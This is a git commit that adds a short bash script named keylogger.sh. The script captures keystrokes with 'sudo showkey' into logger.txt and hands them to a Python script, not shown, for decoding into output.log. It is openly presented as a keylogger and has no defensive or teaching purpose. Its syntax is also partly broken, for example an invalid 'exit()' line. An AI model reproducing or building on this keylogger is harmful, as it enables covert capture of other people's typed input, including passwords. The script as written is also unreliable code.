87a2aedfbb5686aeba04abaeafff30aef1dd3a56
SSHxDEVdiegoalejandroUI <sshxdevdiegoalejandrogo@gmail.com>
2024-05-11 21:05:55 -0600

    update  0.1 keylogger sh

---
+++ keylogger.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+# This is a very basic keylogger which takes input from keyboard using the showkey command 
+# and stores the logs in logger.txt file
+
+
+sudo showkey > ./logger.txt   # captures all the characters entered and stores in logger.txt file in coded form
+
+
+python myscript.py         # runs the python script and decodes all the characters using logger.txt and keymaps.txt
+						   # and stores the results in output.log
+
+
+
+exit()						   
+
+
+
+# diegoalejandro 
